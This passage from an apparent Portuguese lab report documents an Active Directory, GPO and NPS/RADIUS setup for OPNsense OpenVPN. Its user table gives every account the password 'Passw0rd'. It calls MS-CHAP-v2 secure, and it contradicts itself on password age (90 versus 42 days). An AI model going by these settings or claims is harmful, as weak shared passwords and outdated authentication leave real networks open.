necessidades técnicas e administrativas de cada setor em todas as
delegações (Norte, Sul e Este).

![](./images/media/image323.png)

*Figura 271 - Criação de Sub-OU departamental no interior da Unidade
Organizativa Este.*

![](./images/media/image324.png)

*Figura 272 - Criação da Sub-OU IT no interior da Unidade Organizativa
Este.*

![](./images/media/image325.png)

*Figura 273 - Criação da Sub-OU Formacao no interior da Unidade
Organizativa Este.*

![](./images/media/image326.png)

*Figura 274 - Criação da Sub-OU RH no interior da Unidade Organizativa
Este.*

Este procedimento de segmentação foi replicado de forma idêntica para a
estruturação das restantes sub-OUs em todas as localizações geográficas.

![](./images/media/image327.png)

*Figura 275 - Vista consolidada da hierarquia de Unidades Organizativas
(OUs/Sub-OUs) e Grupos de Segurança no domínio AntMarMat.win.*

##### Provisionamento e Alocação de Utilizadores

**Introdução**

A fase final da configuração do diretório consistiu no provisionamento
dos utilizadores no domínio AntMarMat.win. Seguindo rigorosamente a
matriz de identidades fornecida no enunciado, as contas foram criadas e,
posteriormente, movidas para as suas respetivas Unidades Organizativas
(OUs) departamentais e geográficas. Este procedimento garante que cada
utilizador herda automaticamente as políticas de segurança (GPOs) e
permissões de rede definidas para o seu setor específico.

  ----------------------------------------------------------------------------
  **Nome      **Apelido**   **Login         **Localização      **Password**
  Próprio**                 (Username)**    (OU)**             
  ----------- ------------- --------------- ------------------ ---------------
  Sandra      Moita         smoita          RH                 Passw0rd

  Pedro       Linha         plinha          IT                 Passw0rd

  Manuel      Silva         msilva          Formacao           Passw0rd

  João        Calhau        jcalhau         RH                 Passw0rd

  Tiago       Signal        tsignal         IT                 Passw0rd

  Mário       Lelo          mlelo           Formacao           Passw0rd

  Jonas       Fuzeta        jfuzeta         RH                 Passw0rd

  Tania       Santos        tsantos         IT                 Passw0rd

  Marta       Costa         mcosta          Formacao           Passw0rd
  ----------------------------------------------------------------------------

![](./images/media/image328.png)

*Figura 276 - Processo de criação de um novo utilizador no interior da
Sub-OU IT da delegação Este.*

![](./images/media/image329.png)

*Figura 277 - Definição do User logon name para o novo utilizador na
sub-OU IT da delegação Este.*

![](./images/media/image330.png)

*Figura 278 - Definição da password inicial e das políticas de início de
sessão para o utilizador.*

![](./images/media/image331.png)

*Figura 279 - Confirmação final dos dados do novo objeto utilizador no
domínio AntMarMat.win.*

![](./images/media/image332.png)

*Figura 280 - Criação do utilizador na Sub-OU Formacao da delegação
Este.*

![](./images/media/image333.png)

*Figura 281 - Definição de password e políticas de conta para o
utilizador na Sub-OU Formacao da delegação Este.*

![](./images/media/image334.png)

*Figura 282 - Resumo final da criação do utilizador na Sub-OU Formacao
da delegação Este.*

![](./images/media/image335.png)

*Figura 283 - Criação do utilizador na Sub-OU RH da delegação Este.*

![](./images/media/image336.png)

*Figura 284 - Definição de password e parâmetros de segurança para o
utilizador na Sub-OU RH da delegação Este*

![](./images/media/image337.png)

*Figura 285 - Finalização do processo de criação do utilizador na Sub-OU
RH da delegação Este.*

O procedimento de provisionamento descrito foi replicado para a criação
de todos os utilizadores previstos no projeto, garantindo a sua correta
alocação nas respetivas **sub-OUs** e delegações geográficas.

##### Associação de Utilizadores aos Grupos de Segurança

**Introdução**\
Após o provisionamento das contas, procedeu-se à associação dos
utilizadores aos respetivos **Grupos de Segurança Globais** (ex:
ITGeral, RHGeral). Esta etapa é fundamental para a implementação de um
modelo de controlo de acessos baseado em funções (**RBAC**), permitindo
que as permissões em pastas partilhadas, acessos VPN e políticas de
segurança sejam geridas de forma centralizada e eficiente através da
pertença a grupos, em vez de serem atribuídas individualmente a cada
utilizador.

![](./images/media/image338.png)

*Figura 286 - Início do processo de associação de um utilizador a um
grupo através da opção \"Add to a group\...\".*

![](./images/media/image339.png)

*Figura 287 - Pesquisa e seleção do grupo de segurança ITEste para
associação ao utilizador.*

![](./images/media/image340.png)

*Figura 288 - Confirmação da conclusão com sucesso da operação de
associação do utilizador ao respetivo grupo de segurança.*

A validação da correta associação foi efetuada acedendo
às **propriedades do objeto utilizador**, especificamente no
separador **\'Member Of\'**, onde se confirmou a listagem de todos os
grupos de segurança atribuídos.

![](./images/media/image341.png)

*Figura 289 - Verificação da pertença ao grupo ITEste no separador
Member Of das propriedades do utilizador.*

![](./images/media/image342.png)

*Figura 290 -* Acesso ao menu Properties do objeto utilizador para
validação de configurações e pertença a grupos.

Como método complementar de validação, é possível verificar a listagem
de utilizadores a partir da perspetiva do próprio grupo de segurança. Ao
aceder às **Properties** do grupo, o separador **\'Members\'** permite
confirmar todos os objetos que foram corretamente associados a essa
função.

![](./images/media/image343.png)

*Figura 291 - Verificação da lista de utilizadores associados no
separador Members do grupo de segurança ITEste.*

O procedimento de provisionamento e associação foi replicado
exaustivamente para todos os utilizadores do domínio, garantindo a
conformidade com a matriz de acessos definida no enunciado.

### Administração e Gestão de Políticas de Grupo (GPO)

**Introdução**\
A gestão centralizada de configurações e restrições de segurança no
domínio **AntMarMat.win** é realizada através da consola **Group Policy
Management (GPMC)**. Esta ferramenta permite a criação e aplicação de
objetos de política de grupo (**GPOs**) às Unidades Organizativas (OUs)
previamente estruturadas, garantindo o cumprimento dos requisitos de
segurança do projeto.

**Procedimento de Acesso e Navegação:**\
O acesso à consola de gestão pode ser efetuado através dos seguintes
métodos padronizados:

-   **Linha de Comandos (Run/PowerShell):** Execução do
    comando **gpmc.msc** para abertura direta da consola.

-   **Server Manager:** Através do menu **Tools**, selecionando a
    opção **Group Policy Management**.

-   **Navegação Hierárquica:** Expansão da infraestrutura lógica
    seguindo o caminho: **Forest: AntMarMat.win** 

![](./images/media/image344.gif)

No domínio **AntMarMat.win**, é apresentada a estrutura hierárquica
completa das **Unidades Organizativas (OUs)**. Esta organização, que
inclui as delegações **Norte, Sul e Este** e as respetivas sub-OUs,
constitui a base para a aplicação direcionada de objetos de política de
grupo (**GPOs**), conforme os requisitos de segurança do projeto.

![](./images/media/image345.png)

*Figura 292 - Visualização da árvore de diretórios e OUs na consola
Group Policy Management.*

##### Configuração de Políticas de Segurança de Conta ao Nível de Domínio

As políticas de **Complexidade de Palavras-passe** e de **Bloqueio de
Conta** são fundamentais para mitigar ataques de força bruta e garantir
a integridade das credenciais. Por serem transversais a toda a
organização, estas diretivas são implementadas na raiz do domínio,
assegurando a sua propagação por todas as Unidades Organizativas (OUs).

**Procedimento de Implementação:**

-   **Criação e Vinculação:** No console GPMC, efetuou-se um clique com
    o botão direito sobre o domínio raiz (**AntMarMat.win**),
    selecionando a opção **\"Create a GPO in this domain, and Link it
    here\...\"**.

-   **Hierarquia:** Esta abordagem garante que o novo objeto de política
    (**GPO**) seja imediatamente vinculado ao topo da hierarquia,
    aplicando as regras de segurança a todos os utilizadores e
    computadores do domínio de forma centralizada.

![](./images/media/image346.png)

*Figura 293 - Criação e vinculação automática de uma nova GPO na raiz do
domínio AntMarMat.win.*

-   **Identificação do Objeto:** Atribuição de uma nomenclatura
    descritiva ao novo objeto
    --- **\"Politica_PalavrasPasse_Bloqueio\"** --- permitindo uma
    identificação clara da sua finalidade na infraestrutura.

-   **Confirmação e Vinculação:** Após a validação (botão **OK**), o
    objeto de política é criado e automaticamente vinculado à raiz do
    domínio, ficando disponível para a configuração das diretivas de
    segurança de conta.

![](./images/media/image347.png)

*Figura 294 - Atribuição do nome e criação da nova GPO de segurança no
domínio AntMarMat.win.*

-   **Acesso ao Editor:** No console GPMC, efetuou-se um clique com o
    botão direito sobre a GPO criada, selecionando a
    opção **\"Edit\"** para abrir a consola **Group Policy Management
    Editor**.

-   **Navegação Hierárquica:** No editor, navegou-se pelo caminho de
    configuração do computador:

    -   Computer Configuration à Policies à Windows Settings à Security
        Settings à Account Policies à Password Policy.

-   **Definição de Parâmetros de Palavra-passe:** Foram configuradas as
    seguintes diretivas para reforçar a postura de segurança:

    -   **Minimum password length:** Definido para **12 caracteres**,
        garantindo maior resistência contra ataques de força bruta.

    -   **Password must meet complexity requirements:** Configurado
        como **Enabled**, exigindo obrigatoriamente a combinação de
        caracteres maiúsculos, minúsculos, números e símbolos.

    -   **Maximum password age:** Estabelecido em **90 dias**, forçando
        a renovação periódica das credenciais para mitigar o risco de
        contas comprometidas.

![](./images/media/image348.png)

*Figura 295 - Acesso ao menu de edição da GPO
Politica_PalavrasPasse_Bloqueio no console GPMC.*

![](./images/media/image349.png)

*Figura 296 - Definição do comprimento mínimo da palavra-passe (Minimum
password length) para 12 caracteres*

![](./images/media/image350.png)

*Figura 297 -* Ativação da diretiva de requisitos de complexidade para
as palavras-passe do domínio.

![](./images/media/image351.png)

*Figura 298 - Configuração da validade máxima da palavra-passe (Maximum
password age) para 42 dias.*

![](./images/media/image352.png)

*Figura 299 - Vista consolidada das diretivas configuradas na Password
Policy do domínio.*

-   **Configuração da Política de Bloqueio de Conta:** No mesmo
    diretório de políticas de segurança (Account Policies), acedeu-se à
    secção **Account Lockout Policy** para mitigar tentativas de acesso
    não autorizado:

    -   **Account lockout threshold:** Definido para **5 tentativas** de
        início de sessão inválidas, após as quais a conta é
        automaticamente suspensa.

    -   **Account lockout duration:** Estabelecido em **15 minutos**,
        período durante o qual a conta permanecerá inacessível sem
        intervenção do administrador.

    -   **Reset account lockout counter after:** Configurado também
        para **15 minutos**, reiniciando a contagem de tentativas
        falhadas após este intervalo de tempo.

![](./images/media/image353.png)

*Figura 300 - Definição do limite de tentativas de início de sessão
(Account lockout threshold) para 5 tentativas.*

![](./images/media/image354.png)

*Figura 301 - Definição da duração do bloqueio de conta (Account lockout
duration) para 15 minutos.*

![](./images/media/image355.png)

*Figura 302 - Configuração do intervalo para reposição do contador de
bloqueio (Reset account lockout counter after) para 15 minutos.*

![](./images/media/image356.png)

*Figura 303 -* Resumo consolidado das diretivas de bloqueio de conta
(Account Lockout Policy) configuradas no domínio.

Concluída a parametrização das diretivas, encerrou-se a consola
do **Group Policy Management Editor** para retornar à gestão principal
do domínio.

![](./images/media/image357.png)

*Figura 304 - Confirmação da vinculação (Link) da GPO
Politica_PalavrasPasse_Bloqueio à raiz do domínio AntMarMat.win.*

![](./images/media/image358.png)

*Figura 305 - Visualização do separador Details da GPO, confirmando o
estado (Enabled) e o domínio de origem (AntMarMat.win).*

![](./images/media/image359.png)

*Figura 306 - Visualização do separador Settings, detalhando as
diretivas de Password Policy e Account Lockout Policy configuradas na
GPO.*

### Configuração de Diretivas de Firewall do Windows (Zona Green)

**Introdução**\
Com o objetivo de reforçar a segurança dos postos de trabalho na rede
interna (**Zona Green**), procedeu-se à criação de uma GPO dedicada à
gestão centralizada da **Firewall do Windows**. Esta política garante
que todos os clientes (Windows 11) aderem a um perfil de segurança
uniforme, controlando o tráfego de entrada e saída de acordo com as
necessidades operacionais de cada departamento.

**Procedimento de Implementação:**

-   **Segmentação e Vinculação:** Selecionou-se a Unidade Organizativa
    (OU) onde se encontram os objetos de computador (neste caso, a
    sub-OU **IT**), efetuando um clique com o botão direito para
    selecionar a opção **\"Create a GPO in this domain, and Link it
    here\...\"**.

-   **Identificação do Objeto:** Atribuiu-se a
    nomenclatura **\"Politica_Firewall_Windows\"** ao novo objeto de
    política, facilitando a sua futura auditoria e gestão.

![](./images/media/image360.png)

*Figura 307 - Criação e vinculação da GPO de Firewall à Unidade
Organizativa IT do domínio.*

![](./images/media/image361.png)

*Figura 308 - Atribuição do nome Politica_Firewall_Windows à nova GPO no
domínio AntMarMat.win.*

-   **Editamos a GPO:** Após a criação do objeto, acedeu-se à interface
    de edição para parametrizar as regras de segurança e os perfis de
    proteção da firewall para a zona interna (**Green**)

![](./images/media/image362.png)

*Figura 309 - Acesso ao menu de edição da GPO Politica_Firewall_Windows
através da consola de gestão de políticas de grupo.*

-   **Navegação Hierárquica:** No Editor de GPO, acedeu-se ao caminho de
    configuração do computador para gerir a segurança de rede:

    -   Computer Configuration à Policies à Windows Settings à Security
        Settings à **Windows Defender Firewall with Advanced Security**.

-   **Seleção do Objeto de Gestão:** Selecionou-se o nó principal da
    firewall para abrir o painel de controlo centralizado das definições
    de segurança.

-   **Acesso às Propriedades Globais:** No painel de visualização à
    direita, clicou-se na opção **\"Windows Defender Firewall
    Properties\"** para configurar o estado de ativação e o
    comportamento dos perfis de proteção.

![](./images/media/image363.png)

*Figura 310 - Acesso às propriedades globais da Windows Defender
Firewall na consola de edição de GPO.*

-   Para cada perfil (Domain, Private, Public): Definimos **Firewall
    state** = On (recommended).

![](./images/media/image364.png)

*Figura 311 - Ativação do estado da firewall (On (recommended)) para o
perfil de domínio (Domain Profile).*

![](./images/media/image365.png)

*Figura 312 - Ativação do estado da firewall (On (recommended)) para o
perfil privado (Private Profile).*

![](./images/media/image366.png)

*Figura 313 - Ativação do estado da firewall (On (recommended)) para o
perfil público (Public Profile).*

-   **Finalização e Âmbito de Aplicação:** Concluída a parametrização,
    encerrou-se o editor. A política encontra-se agora ativa e
    vinculada, garantindo que as diretivas de firewall são aplicadas
    automaticamente a todos os postos de trabalho (Windows 11)
    integrados na **Zona Green** e pertencentes à respetiva Unidade
    Organizativa.

![](./images/media/image367.png)

*Figura 314 - Confirmação da vinculação da Politica_Firewall_Windows à
Unidade Organizativa de destino na consola GPMC.*

![](./images/media/image368.png)

*Figura 315 - Visualização dos detalhes da GPO
Politica_Firewall_Windows, confirmando o seu estado como Enabled e o
domínio de origem.*

![](./images/media/image369.png)

*Figura 316 - Visualização do separador Scope, confirmando a vinculação
da GPO à OU IT e os filtros de segurança aplicados.*

##### Replicação da Política de Firewall para as Restantes Localizações

**Introdução**\
De forma a garantir a uniformidade das regras de segurança em toda a
infraestrutura, procedeu-se à vinculação da GPO de Firewall às Unidades
Organizativas (OUs) de suporte técnico das restantes delegações.

**Procedimento de Vinculação:**\
A aplicação da política nas OUs **IT** das
delegações **Sul** e **Este** foi executada conforme os passos
seguintes:

-   **Vinculação na Delegação Sul:**

    -   Clicou-se com o botão direito na sub-OU **IT** (dentro da OU
        Sul) 

![](./images/media/image344.gif)

 selecionou-se a opção **\"Link an Existing GPO\...\"**.

-   Na lista de objetos disponíveis do domínio, selecionou-se o
    objeto **\"Politica_Firewall_Windows\"** 

![](./images/media/image370.gif)

 clicou-se em **OK**.

-   **Vinculação na Delegação Este:**

    -   Repetiu-se o processo para a sub-OU **IT** (dentro da OU Este):
        Botão direito 

![](./images/media/image344.gif)

 **\"Link an Existing GPO\...\"**.

-   Selecionou-se a mesma GPO de firewall 

![](./images/media/image344.gif)

 clicou-se em **OK** para concluir a propagação da política.

![](./images/media/image371.png)

*Figura 317 - Seleção da opção \"Link an Existing GPO\...\" na sub-OU IT
da delegação Sul.*

![](./images/media/image372.png)

*Figura 318 - Seleção do objeto de política Politica_Firewall_Windows na
lista de GPOs do domínio.*

![](./images/media/image373.png)

*Figura 319 - Visualização da GPO de Firewall vinculada com sucesso às
sub-OUs IT das delegações Este, Norte e Sul.*

##### Implementação de Diretivas de Restrição de Início de Sessão (Logon)

**Introdução**\
De forma a garantir que apenas pessoal autorizado tem acesso físico ou
remoto aos postos de trabalho críticos, procedeu-se à criação de uma GPO
de **Restrição de Logon**. Esta política assegura o princípio do
privilégio mínimo, limitando o acesso aos sistemas apenas aos grupos
de **Administradores** e à equipa de **IT**, mitigando assim o risco de
acessos não autorizados por parte de outros utilizadores do domínio.

**Procedimento de Implementação:**

-   **Vinculação à Unidade Organizativa:** No console GPMC, efetuou-se
    um clique com o botão direito sobre a sub-OU **IT** à selecionou-se
    a opção **\"Create a GPO in this domain, and Link it here\...\"**.

-   **Nomenclatura do Objeto:** Atribuiu-se o
    nome **\"Politica_Restricoes_Logon\"** ao novo objeto de política,
    facilitando a sua identificação e gestão na infraestrutura do
    domínio **AntMarMat.win**.

![](./images/media/image374.png)

*Figura 320 - Seleção da opção \"Create a GPO in this domain, and Link
it here\...\" na sub-OU IT da delegação Este.*

![](./images/media/image375.png)

*Figura 321 - Atribuição do nome Politica_Restricoes_Logon ao novo
objeto de política de grupo.*

-   **Edição e Configuração de Acessos:** No console GPMC, acedeu-se ao
    menu de edição da política para definir os privilégios de acesso
    local aos postos de trabalho:

![](./images/media/image376.png)

*Figura 322 - Acesso ao menu de edição da
GPO **Politica_Restricoes_Logon** para configuração de direitos de
utilizador.*

-   Computer Configuration à Policies à Windows Settings à Security
    Settings à Local Policies 

![](./images/media/image344.gif)

 **User Rights Assignment**.

-   **Atribuição de Privilégios Locais:**

    -   Localizou-se a diretiva **Allow log on locally** 

![](./images/media/image344.gif)

 Duplo clique para abrir as propriedades.

-   Ativou-se a opção **\"Define these policy settings\"** para permitir
    a edição.

-   **Controlo de Acesso:** Clicou-se em **Add User or Group** para
    restringir o login apenas aos grupos
    autorizados: **\"Administrators\"** (locais/domínio) e o grupo de
    segurança **\"ITGeral\"**.

![](./images/media/image377.png)

*Figura 323 - Seleção da diretiva Allow log on locally no nó de
atribuição de direitos de utilizador (User Rights Assignment).*

![](./images/media/image378.png)

*Figura 324 - Ativação da diretiva e acesso ao menu de adição de
utilizadores ou grupos (**Add User or Group**).*

![](./images/media/image379.png)

*Figura 325 - Adição do grupo de segurança **ITGeral** à lista de
permissões da diretiva **Allow log on locally**.*

![](./images/media/image380.png)

*Figura 326 - Confirmação da inclusão dos
grupos **Administrators** e **ITGeral** na diretiva de início de sessão
local.*

![](./images/media/image381.png)

*Figura 327 - Aplicação e confirmação das definições da diretiva **Allow
log on locally** para os grupos selecionados.*

![](./images/media/image382.png)

*Figura 328 - Visualização da diretiva **Allow log on locally** com os
grupos de segurança autorizados no Editor de Gestão de Políticas de
Grupo.*

![](./images/media/image383.png)

*Figura 329 - Listagem final dos grupos autorizados
(**Administrators** e grupos de **IT**) na diretiva de início de sessão
local.*

![](./images/media/image384.png)

*Figura 330 - Configuração da diretiva **Deny log on locally** para
impedir o acesso local aos grupos de **Formação** e **RH** no domínio.*

##### Propagação e Validação das Políticas de Grupo (GPO)

**Introdução**\
Após a configuração e vinculação das GPOs no Controlador de Domínio, é
necessário garantir a sua correta propagação para os postos de trabalho
clientes (**Zona Green**). Embora o Windows realize atualizações
automáticas periódicas, em ambiente de teste e implementação,
procedeu-se à atualização forçada para validação imediata das diretivas.

**Procedimento de Atualização e Diagnóstico:**\
No cliente Windows 11, foram executados os seguintes passos através da
linha de comandos (**PowerShell/CMD**) com privilégios de administrador:

-   **Atualização Forçada:** Execução do comando gpupdate /force para
    garantir que todas as novas diretivas de computador e utilizador são
    descarregadas e aplicadas de imediato.

-   **Auditoria de Aplicação:** Utilização do comando gpresult /r para
    gerar um relatório sumário das políticas aplicadas, confirmando se
    as GPOs criadas (Firewall, Restrições de Logon, etc.) estão no
    estado **\"Applied\"**.

**Testes de Conformidade (Compliance):**\
Para validar a eficácia das restrições de segurança, efetuaram-se os
seguintes testes práticos:

-   **Tentativa de Acesso Não Autorizado:** Tentou-se efetuar o início
    de sessão com um utilizador da sub-OU **RH** num computador
    pertencente à OU **IT**. Conforme configurado na diretiva *Deny log
    on locally*, o sistema recusou a autenticação, validando o controlo
    de acessos.

-   **Verificação de Firewall:** Confirmou-se que o estado da firewall
    no cliente passou a ser gerido centralmente pelo administrador do
    domínio, impedindo alterações locais pelo utilizador.

**Windows Server**

No âmbito da infraestrutura de rede, o Windows Server atua como o
Controlador de Domínio (DC), centralizando a gestão de identidades e a
segurança de todo o ambiente. Através da ferramenta Group Policy
Management, foram definidas as diretivas (GPOs) que asseguram a
conformidade dos postos de trabalho, garantindo que as regras de
firewall e as restrições de acesso são aplicadas de forma uniforme a
todos os objetos do domínio.

![](./images/media/image385.png)

![](./images/media/image386.png)

*Figura 331 - Verificação da hierarquia de domínios e das definições de
segurança aplicadas ao perfil de Administrador no Windows Server.*

**Testes de Validação (Windows 11 - Zona Green)**

A fase de testes no cliente Windows 11 visou auditar a eficácia da
propagação das políticas configuradas no servidor. Através da execução
de diagnósticos via terminal e de tentativas reais de acesso não
autorizado, validou-se que as restrições impostas pelo administrador
foram corretamente interpretadas e executadas pelo sistema operativo
cliente, garantindo a integridade da Zona Green.

![](./images/media/image387.png)

![](./images/media/image388.png)

*Figura 332 - Verificação dos grupos de segurança e validação da correta
integração do cliente Windows 11 no domínio corporativo.*

![](./images/media/image389.png)

*Figura 333 - Execução do comando gpupdate /force no Windows 11,
confirmando a receção e aplicação imediata das diretivas de computador e
utilizador.*

![](./images/media/image390.png)

*Figura 334 - Interface da Firewall no Windows 11 exibindo a restrição
de gestão pelo administrador, validando a aplicação da GPO de
segurança.*

![](./images/media/image391.png)

*Figura 335 - Teste de autenticação no Windows 11 com um utilizador do
domínio, validando o processo de início de sessão na estação de trabalho
cliente.*

![](./images/media/image392.png)

*Figura 336 - Validação da diretiva Deny log on locally: mensagem de
erro ao tentar o início de sessão com um utilizador sem permissões para
esta estação de trabalho.*

## Implementação de NPS/RADIUS para Autenticação OpenVPN (Exclusiva IT)

##### Configuração no Windows Server 2022: 

Para centralizar a autenticação da VPN e garantir que apenas o grupo de
IT tenha acesso remoto, procedeu-se à instalação do serviço NPS:

-   **Server Manager à Manage à Add Roles and Features**.

-   **Installation Type à Role-based or feature-based installation**.

-   **Server Selection à Seleção do servidor local (WINSERVER_AMM).**

-   **Server Roles à Ativação de Network Policy and Access Services
    (NPS).**

-   **Features/Confirmation à Next à Install** para concluir a
    implementação da função.

![](./images/media/image393.png)

*Figura 337 - Acesso ao assistente de configuração no Windows Server
para a adição da função de Network Policy and Access Services (NPS).*

![](./images/media/image394.png)

*Figura 338 - Seleção do método de instalação por função (Role-based) no
Windows Server para a implementação do serviço RADIUS.*

![](./images/media/image395.png)

*Figura 339 - Seleção do servidor de destino (WINSERVER_AMM) para a
instalação da função NPS.*

![](./images/media/image396.png)

*Figura 340 - Ativação da função Network Policy and Access Services
(NPS) na lista de Server Roles.*

![](./images/media/image397.png)

*Figura 341 -* Adição das funcionalidades e ferramentas de gestão remota
requeridas para o serviço NPS.

![](./images/media/image398.png)

*Figura 342 -* Confirmação das funcionalidades (Features) adicionais
necessárias para o suporte ao serviço NPS.

![](./images/media/image399.png)

*Figura 343 - Ecrã informativo detalhando as capacidades do serviço
Network Policy and Access Services para autenticação RADIUS.*

![](./images/media/image400.png)

*Figura 344 - Verificação final das funções e ferramentas de
administração a instalar antes do início do processo.*

![](./images/media/image401.png)

*Figura 345 - Conclusão do assistente com sucesso, confirmando a
instalação da função NPS no controlador de domínio.*

##### Autorização do NPS no Domínio

Para permitir que o serviço NPS consulte as propriedades das contas de
utilizador no **Active Directory**, procedeu-se à sua autorização no
domínio:

-   **Acesso à Consola:** Execução do comando nps.msc para abrir a
    consola de gestão do **Network Policy Server**.

-   **Autorização no AD:** Clique com o botão direito em **NPS
    (Local)** 

![](./images/media/image344.gif)

 **Register server in Active Directory**.

-   **Confirmação:** Seleção de **OK** nas caixas de diálogo
    subsequentes para validar a permissão de leitura do servidor NPS
    sobre os objetos do domínio.

![](./images/media/image402.png)

*Figura 346 - Registo e autorização do servidor NPS no Active Directory
para permitir a consulta e validação de credenciais de utilizadores do
domínio.*

##### Configuração do RADIUS Client (OPNsense)

Para que a firewall **OPNsense** possa enviar pedidos de autenticação ao
servidor NPS, foi necessário registá-la como um cliente RADIUS:

-   **Navegação na Consola:** Expansão de **RADIUS Clients and
    Servers** à **RADIUS Clients** à Botão direito à **New**.

-   **Identificação do Cliente:**

    -   **Friendly name:** MarteSuf-OpenVPN (nome descritivo para
        identificação no log).

    -   **Address (IP or DNS):** Introdução do IP da
        interface **Green** da OPNsense (172.30.50.97), garantindo a
        comunicação direta na rede interna.

-   **Segurança (Shared Secret):**

    -   **Shared Secret:** Configuração de uma chave partilhada robusta,
        essencial para cifrar a comunicação entre o servidor e o cliente
        RADIUS.

-   **Protocolo:**

    -   **Vendor:** Seleção de **RADIUS Standard** à **OK**.

![](./images/media/image403.png)

*Figura 347 - Início do processo de registo de um novo RADIUS Client
(OPNsense) na consola de gestão NPS.*

![](./images/media/image404.png)

*Figura 348 - Configuração detalhada do cliente RADIUS (OPNsense) com o
endereço IP 172.30.50.97 e a definição da chave partilhada (Shared
Secret).*

![](./images/media/image405.png)

*Figura 349 - Listagem de clientes RADIUS configurados, confirmando o
estado \"Enabled\" para o ponto de acesso remoto MarteSuf-OpenVPN.*

##### Criação de Diretivas de Rede (Network Policies)

Com o cliente RADIUS registado, procedeu-se à criação da regra que
define as condições de acesso remoto para os utilizadores do domínio:

-   **Navegação na Consola:** Expansão do nó **Policies** à **Network
    Policies**.

-   **Ação:** Clique com o botão direito sobre **Network Policies** à
    **New**.

-   **Objetivo:** Iniciar o assistente de configuração para definir as
    permissões de acesso, métodos de autenticação e restrições de grupo.

![](./images/media/image406.png)

*Figura 350 - Início da criação de uma nova diretiva de rede (Network
Policy) para definir as condições de acesso à OpenVPN.*

##### Identificação da Diretiva de Rede 

Nesta fase, procedeu-se à atribuição de um nome descritivo e à definição
do tipo de servidor de acesso que irá consumir esta política:

-   **Policy name:** Definição do nome VPN_IT_Auth, facilitando a
    auditoria e identificação da regra nos logs do servidor.

-   **Type of network access server:** Seleção de **Remote Access Server
    (VPN-Dial up)** à **Next**.

    -   *Nota: Esta opção garante que a política é otimizada para
        pedidos de autenticação provenientes de túneis VPN.*

![](./images/media/image407.png)

*Figura 351 - Definição do nome da diretiva (VPN_IT_Auth) e seleção do
tipo de servidor de acesso (Remote Access Server) para o túnel VPN.*

**Definição de Condições de Acesso (Segregação de Grupos)**

Nesta fase, estabeleceu-se o critério fundamental para a autorização do
túnel VPN, restringindo o acesso exclusivamente à equipa técnica:

-   **Conditions:** Clique em **Add** para definir os parâmetros de
    filtragem da ligação.

-   **Seleção de Objeto:** Escolha da opção **User Groups** (ou *Windows
    Groups*) 

![](./images/media/image344.gif)

 **Add Groups**.

-   **Filtro de Segurança:** Pesquisa e seleção do grupo **IT** no
    Active Directory à **OK**.

    -   *Nota: Esta configuração assegura que qualquer tentativa de
        login por utilizadores fora deste grupo (ex: RH) será
        automaticamente rejeitada pelo servidor RADIUS.*

![](./images/media/image408.png)

*Figura 352 - Seleção do critério \"Windows Groups\" para restringir a
autenticação VPN a grupos específicos do Active Directory.*

![](./images/media/image409.png)

*Figura 353 - Adição dos grupos de segurança IT do domínio como condição
obrigatória para a validação da política de acesso remoto.*

**Definição de Permissões de Acesso**

Após a configuração das condições de grupo, estabeleceu-se a ação a
tomar pelo servidor NPS quando um pedido de autenticação for validado:

-   **Access Permission:** Seleção da opção **Access granted**.

-   **Objetivo:** Garantir que o acesso à rede é concedido imediatamente
    se a tentativa de ligação do cliente corresponder a todas as
    condições definidas na política.

![](./images/media/image410.png)

*Figura 354 - Configuração da permissão de acesso (Access Granted) para
utilizadores que cumpram os requisitos da diretiva de rede.*

**Configuração dos Métodos de Autenticação**

Para garantir a compatibilidade e a segurança na troca de credenciais
entre a **OpenVPN** e o servidor **RADIUS**, procedeu-se à seleção do
protocolo de autenticação:

-   **Authentication Methods:** Seleção exclusiva do método **Microsoft
    Encrypted Authentication version 2 (MS-CHAP-v2)**.

    -   *Nota: Este protocolo é o padrão de mercado para autenticação
        RADIUS segura, sendo um requisito obrigatório para a correta
        integração com o serviço OpenVPN da firewall.*

-   **Finalização:** Clique em **Next** à **Finish** para concluir a
    criação e ativação da diretiva de rede.

![](./images/media/image411.png)

*Figura 355 - Seleção do protocolo MS-CHAP-v2 como método de
autenticação seguro para a diretiva de acesso remoto.*

![](./images/media/image412.png)

*Figura 356 - Ecrã de configuração de restrições (Constraints), onde se
mantiveram as opções por omissão antes de prosseguir no assistente.*

![](./images/media/image413.png)

*Figura 357 - Ecrã de configuração de definições (Settings) e atributos
RADIUS padrão para a diretiva de rede.*

![](./images/media/image414.png)

*Figura 358 -* Adição de atributos RADIUS (Standard) para a
personalização das definições da diretiva de rede.

![](./images/media/image415.png)

*Figura 359 - Configuração manual do atributo RADIUS (Class),
estabelecendo uma identificação adicional para a integração com a
política de acesso.*

![](./images/media/image416.png)

*Figura 360 - Resumo das definições de rede e atributos RADIUS
configurados, incluindo o atributo \"Class\" para identificação do grupo
ITGeral.*

![](./images/media/image417.png)

*Figura 361 - Resumo das definições da nova diretiva de rede
(VPN_IT_Auth), evidenciando os grupos de utilizadores autorizados e o
método de autenticação MS-CHAP-v2.*

![](./images/media/image418.png)

*Figura 362 - Consola de gestão NPS exibindo a diretiva \"VPN_IT_Auth\"
ativa e com prioridade máxima na lista de Network Policies.*

##### Integração e Validação do Servidor RADIUS na OPNsense

Para viabilizar a autenticação centralizada dos administradores (Grupo
IT) na interface de gestão da firewall, procedeu-se à configuração do
cliente RADIUS na OPNsense:

**1. Registo do Servidor de Autenticação**

-   **Caminho:** **System** à **Access** à **Servers**.

-   **Configuração do Novo Servidor (+ Add):**

    -   **Descriptive name:** WinServer_RADIUS (Identificador do
        serviço).

    -   **Type:** **RADIUS**.

    -   **Hostname or IP address:** 172.30.50.98 (Endereço IP do Windows
        Server/NPS).

    -   **Shared Secret:** Inserção da chave partilhada definida no NPS
        para cifrar a comunicação.

    -   **Services offered:** Seleção de **Authentication** (validação
        de credenciais).

    -   **Synchronize groups:** Ativação desta opção (crítica para a
        interpretação do atributo *Class* enviado pelo NPS).

**2. Mapeamento de Privilégios e Grupos**\
Para garantir que o utilizador autenticado herda permissões de
administração:

-   **Caminho:** **System** à **Access** à **Groups**.

-   **Criação de Grupo (+ Add):** Nomeação do grupo com valor idêntico
    ao atributo *Class* configurado no NPS.

-   **Atribuição de Privilégios:** Definição das permissões de acesso
    (ex: **GUI-All pages**) para gestão integral da firewall via
    interface web.

**3. Teste e Validação da Autenticação**

-   **Caminho:** **System** **à Access** **à Tester**.

**Procedimento de Diagnóstico:**\
No ecrã de teste, executaram-se os seguintes passos para validar a
conectividade:

-   **Authentication Server:** Seleção do servidor WinServer_RADIUS.

-   **Username:** Introdução de um utilizador pertencente ao grupo IT
    (ex: plinha).

